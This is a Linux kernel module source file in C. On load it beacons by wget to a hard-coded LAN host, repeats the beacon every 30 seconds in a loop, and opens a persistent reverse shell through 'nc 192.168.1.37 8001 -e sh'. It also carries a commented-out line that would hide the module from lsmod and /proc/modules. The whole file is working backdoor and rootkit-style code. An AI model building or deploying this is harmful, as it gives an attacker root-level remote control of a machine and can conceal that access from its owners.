#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tibo.wav");
MODULE_DESCRIPTION("kernel module to make requests with wget to the host every 30s");
MODULE_VERSION("1.0");

void make_request(char *str);
void make_request_periodic(void);
void kill_all_communications(void); 
void rev_shell(void);

// init function
static int __init kernel_network_init(void) {
	make_request("START");
	make_request_periodic();
	rev_shell();
//	list_del(&THIS_MODULE->list); // remove from lsmod and /proc/modules
	return 0;
}

// exit function
static void __exit kernel_network_exit(void) {
	make_request("STOP");
	kill_all_communications();

}

// function to make requests with a specified string
void make_request(char *str) {
	char *command = kmalloc(strlen(str) + strlen("http://192.168.1.37:8000/") + 1, GFP_KERNEL);
	strcpy(command, "http://192.168.1.37:8000/");
	strcat(command, str);
	char *argv[] = {"/usr/bin/wget", command, NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
	kfree(command);
}

//function to make a request every 30s
void make_request_periodic(void) {
	char *str = "while true; do wget http://192.168.1.37:8000/UP; sleep 30; done";
	char *argv[] = {"/bin/sh", "-c", str, NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

// function to kill all periodic communications with the host
// without this function, the requests will continue even after the module is removed
void kill_all_communications(void) {
	char *killcom = "kill $(pgrep -f '192.168.1.37');";
	char *argv[] = {"/bin/sh", "-c", killcom, NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

// initiate rev shell
void rev_shell(void) {
	char *shell = "while true; do nc 192.168.1.37 8001 -e sh; sleep 30; done";
	char *argv[] = {"/bin/sh", "-c", shell, NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

EXPORT_SYMBOL(make_request);
EXPORT_SYMBOL(kill_all_communications);

module_init(kernel_network_init);
module_exit(kernel_network_exit);
